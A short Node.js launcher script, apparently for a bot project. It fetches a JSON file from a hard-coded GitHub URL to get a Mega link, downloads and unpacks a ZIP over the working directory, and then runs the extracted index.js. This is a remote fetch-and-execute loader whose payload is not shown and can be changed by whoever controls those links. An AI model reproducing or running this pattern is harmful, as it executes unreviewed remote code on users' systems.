const fs = require('fs');
const path = require('path');
const { File } = require('megajs');
const AdmZip = require('adm-zip');
const axios = require('axios');

// Function to download and extract a ZIP file from a Mega URL
const downloadAndExtractMegaZip = (megaUrl) => {
  return new Promise((resolve, reject) => {
    try {
      console.log('Downloading Files... 📥');
      const megaFile = File.fromURL(megaUrl);
      const currentDir = process.cwd();
      const zipPath = path.join(currentDir, 'tharuzzexample.zip');

      // Download the file from Mega
      megaFile.download((error, data) => {
        if (error) {
          return reject(error);
        }

        // Save the downloaded data to a ZIP file
        fs.writeFileSync(zipPath, data);

        // Extract the ZIP file to the current directory
        const zip = new AdmZip(zipPath);
        zip.extractAllTo(currentDir, true);

        // Delete the ZIP file after extraction
        fs.unlinkSync(zipPath);

        console.log('Downloading Success And Starting ✅');
        resolve();
      });
    } catch (error) {
      reject(error);
    }
  });
};

// Main function to fetch data and execute the download
const main = async () => {
  try {
    console.log('Fetching data... 🚀');
    // Fetch JSON data containing the Mega URL
    const response = await axios.get(
      'https://raw.githubusercontent.com/Chamijd/hirucmd//refs/heads/main/detals.json'
    );
    const { zip: megaUrl } = response.data;

    // Download and extract the ZIP file
    await downloadAndExtractMegaZip(megaUrl);

    // Run the extracted index.js file
    require('./index.js');
  } catch (error) {
    console.error('An error occurred:', error.message);
  }
};

// Execute the main function
main();
